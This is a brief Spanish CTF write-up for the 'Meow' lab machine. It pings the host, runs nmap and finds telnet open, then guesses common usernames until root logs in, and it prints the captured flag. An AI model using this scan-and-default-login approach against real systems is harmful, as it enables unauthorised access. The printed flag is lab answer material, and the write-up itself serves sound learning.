# Meow

realize un ping a la coneccion para vereficar que la ip dada existia

```ping 10.129.119.162```

Luego realice nmap para verificar los puestos activos y los servicios que corrian por los mismos

```nmap -Pn 10.129.119.162
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 18:46 -03                                   │root@Meow:~# ls
Nmap scan report for 10.129.119.162 (10.129.119.162)                                              │flag.txt  snap
Host is up (0.35s latency).                                                                       │root@Meow:~# cat flag.txt 
Not shown: 999 closed tcp ports (reset)                                                           │b40abdfe23665f766f9c61ecba8a4c19
PORT   STATE SERVICE                                                                              │root@Meow:~# cd snap/
23/tcp open  telnet                                                                               │root@Meow:~/snap# ls
                                                                                                  │lxd
Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds
```
detectando el servicio, me conecte con el servicio telnet
```telnet 10.129.119.162```

realice el login con los tipicos usuarios 

* admin
* administrator
* root

finalmente root dio resultados, y pude acceder al sistema y obtener la bandera

